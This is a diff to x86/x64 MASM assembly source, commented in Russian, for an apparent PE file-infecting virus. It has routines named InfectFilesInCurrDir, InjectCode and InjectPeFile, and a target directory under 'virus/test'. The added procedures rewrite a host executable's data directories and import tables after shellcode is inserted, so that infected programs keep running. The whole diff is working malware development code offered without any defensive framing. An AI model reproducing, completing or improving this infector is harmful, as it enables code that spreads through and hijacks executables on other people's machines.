@@ -24,6 +24,7 @@ include wsock32.inc
 endif
 
 ifdef _WIN64
+
 CLIST_ENTRY typedef LIST_ENTRY64
 ; машинное слово текущей архитектуры
 cword typedef qword
@@ -42,7 +43,10 @@ cur_seg_reg equ <gs>
 MANAGER_SIZE equ <24h>
 RELOC_TYPE equ <IMAGE_REL_BASED_DIR64>
 isize equ <Size_>
+IMAGE_ORDINAL_FLAG equ IMAGE_ORDINAL_FLAG64
+
 else 
+
 CLIST_ENTRY typedef LIST_ENTRY32
 ; машинное слово текущей архитектуры
 cword typedef dword
@@ -60,12 +64,15 @@ OFFSET_INIT_LIST equ <1Ch>
 cur_seg_reg equ <fs>
 MANAGER_SIZE equ <18h>
 RELOC_TYPE equ <IMAGE_REL_BASED_HIGHLOW>
+IMAGE_ORDINAL_FLAG equ IMAGE_ORDINAL_FLAG32
+
 endif 
 
 ADDITIONAL_RELOC_TABLE_SIZE equ <(2*sizeof(dword) + 2*sizeof(word))> 		; (c заголовком и ABSOLUTE)
 SHELL_TABLE_SIZE equ <(4*sizeof(dword) + 5*sizeof(cword))>
 IMAGE_DATA_DIRECTORY_SIZE equ <2*sizeof(dword)>
 IMAGE_SECTION_HEADER_SIZE equ <sizeof(IMAGE_SECTION_HEADER)>
+IMAGE_IMPORT_DESCRIPTOR_SIZE equ <sizeof(IMAGE_IMPORT_DESCRIPTOR)>
 DbgBreak   equ int 3
 
 include ..\inc\pe_parser.inc
@@ -138,6 +145,10 @@ InfectFilesInCurrDir proto CurrentStdcallNotation
 Freeze proto CurrentStdcallNotation
 InjectCode proto CurrentStdcallNotation :cword, :cword, :cword
 ExtendLastSection proto CurrentStdcallNotation :cword, :cword, :cword, :cword
+; 
+HandleAllTables proto CurrentStdcallNotation :cword, :dword, :dword, :dword
+HandleImportTable proto CurrentStdcallNotation :cword, :cword, :dword, :dword
+
 
 DefineStdcallProto MessageBoxA, 4
 DefineStdcallProto VirtualProtect, 4
@@ -189,7 +200,7 @@ else
 endif
 
 isFirst db 1	; 1 - если дроп первого шеллкода, потом будет везде 0
-targetDir db "C:/work/code/virus/test/test", 0 
+targetDir db "C:/work/code/virus/test", 0 
 originalEP dq 0
 scInfo SC_PARAMS <0>
 
@@ -304,7 +315,7 @@ INJECTION_SIGN 	equ 050h
         ret
     .endif
 
-    DbgBreak
+    ;DbgBreak
     mov cax, [pVASc]
     mov [cbx+scInfo].SC_PARAMS.startRVA, cax 
 
@@ -313,7 +324,8 @@ INJECTION_SIGN 	equ 050h
     mov [globalSCSize], cax
 
     mov cdi, [pe]
-    lea cdx, [cdi].IMAGE_NT_HEADERS.OptionalHeader
+    mov cdx, [cdi].PeHeaders.nthead
+    lea cdx, [cdx].IMAGE_NT_HEADERS.OptionalHeader
     invoke AlignToTop, [globalSCSize], [cdx].IMAGE_OPTIONAL_HEADER.SectionAlignment
     invoke HandleAllTables, [pe], [pVASc], [globalSCSize], eax
 
@@ -326,8 +338,122 @@ INJECTION_SIGN 	equ 050h
 InjectPeFile endp
 
 
+; обработка всех таблиц (если они находятся после первой секции меняем их RVA и RVA, что в них содержатся)
+HandleAllTables proc CurrentStdcallNotation uses cbx cdi pe:cword, scRVA:dword, scSize:dword, allignScSize:dword
 
+    ifdef _WIN64
+		mov [rbp + 10h], rcx
+		mov [rbp + 18h], rdx
+		mov [rbp + 20h], r8
+		mov [rbp + 28h], r9
+	endif
 
+    ; Обрабатываем директории
+    mov cax, [pe]
+    mov cax, [cax].PeHeaders.nthead
+    lea cdi, [cax].IMAGE_NT_HEADERS.OptionalHeader;.DataDirectory
+	lea cdi, [cdi].IMAGE_OPTIONAL_HEADER.DataDirectory
+    
+    ;DbgBreak
+    xor ccx, ccx
+    .while ccx < IMAGE_NUMBEROF_DIRECTORY_ENTRIES
+        xor cax, cax
+        mov eax, [cdi].IMAGE_DATA_DIRECTORY.VirtualAddress
+        .if eax >= [scRVA] && [cdi].IMAGE_DATA_DIRECTORY.isize != 0
+            mov csi, [pe]
+            mov csi, [csi].PeHeaders.mem
+            invoke RvaToOffset, cax, [pe]
+            add csi, cax        ; csi = pe.mem + VA
+            .if ecx == IMAGE_DIRECTORY_ENTRY_IMPORT
+                ;DbgBreak
+                invoke HandleImportTable, [pe], csi, [scRVA], [allignScSize]
+            .elseif ecx ==  IMAGE_DIRECTORY_ENTRY_EXPORT
+                mov cax, cax
+            .endif
+            
+            mov eax, [allignScSize]
+            add [cdi].IMAGE_DATA_DIRECTORY.VirtualAddress, eax
+        .endif
+        inc ccx
+        add cdi, IMAGE_DATA_DIRECTORY_SIZE
+    .endw    
+
+    ret
+HandleAllTables endp
+
+HandleImportTable proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pIDT:cword, scRVA:dword, scSize:dword
+
+	local currEntry:cword
+    local iat:cword
+
+	ifdef _WIN64
+		mov [rbp + 10h], rcx
+		mov [rbp + 18h], rdx
+		mov [rbp + 20h], r8
+		mov [rbp + 28h], r9
+	endif
+
+	mov cax, [pIDT]
+	mov [currEntry], cax
+    mov cdi, [currEntry]
+	.while !([cdi].IMAGE_IMPORT_DESCRIPTOR.FirstThunk == NULL && \
+           [cdi].IMAGE_IMPORT_DESCRIPTOR.Characteristics == NULL && \
+           [cdi].IMAGE_IMPORT_DESCRIPTOR.ForwarderChain == NULL && \
+           [cdi].IMAGE_IMPORT_DESCRIPTOR.Name1 == NULL && \
+           [cdi].IMAGE_IMPORT_DESCRIPTOR.OriginalFirstThunk == NULL && \
+           [cdi].IMAGE_IMPORT_DESCRIPTOR.TimeDateStamp == NULL) 
+
+        .if [cdi].IMAGE_IMPORT_DESCRIPTOR.Name1 != NULL
+            mov eax, [cdi].IMAGE_IMPORT_DESCRIPTOR.Name1
+            .if eax >= [scRVA]
+                add eax, [scSize]
+                mov [cdi].IMAGE_IMPORT_DESCRIPTOR.Name1, eax
+            .endif
+        .endif
+
+        DbgBreak
+        xor csi, csi
+        .if [cdi].IMAGE_IMPORT_DESCRIPTOR.OriginalFirstThunk != NULL
+            mov esi, [cdi].IMAGE_IMPORT_DESCRIPTOR.OriginalFirstThunk
+        .else
+            mov esi, [cdi].IMAGE_IMPORT_DESCRIPTOR.FirstThunk
+        .endif
+        xor cax, cax
+        invoke RvaToOffset, csi, [pe]
+        mov csi, [pe]
+        mov cdx, [csi].PeHeaders.mem
+        add cax, cdx    ; csi = iat
+        mov [iat], cax
+    
+        mov csi, [iat]
+        .while cword ptr [csi] != NULL
+            xor cdx, cdx
+            mov edx, [scRVA]
+            .if !(cword ptr [csi] & IMAGE_ORDINAL_FLAG) && \
+                (cword ptr [csi] >= cdx)
+
+                mov edx, [scSize]
+                add dword ptr [csi], edx
+            .endif
+            add csi, sizeof(cword)
+        .endw
+
+        mov eax, [cdi].IMAGE_IMPORT_DESCRIPTOR.OriginalFirstThunk
+        .if eax != NULL && eax >= [scRVA]
+            add eax, [scSize]
+            mov [cdi].IMAGE_IMPORT_DESCRIPTOR.OriginalFirstThunk, eax
+        .endif
+        mov eax, [cdi].IMAGE_IMPORT_DESCRIPTOR.FirstThunk
+        .if eax != NULL && eax >= [scRVA]
+            add eax, [scSize]
+            mov [cdi].IMAGE_IMPORT_DESCRIPTOR.FirstThunk, eax
+        .endif
+        
+        add cdi, IMAGE_IMPORT_DESCRIPTOR_SIZE
+	.endw
+
+	ret
+HandleImportTable endp
 
 ;
 ; Внедрение в PE-файлы в директории dirName
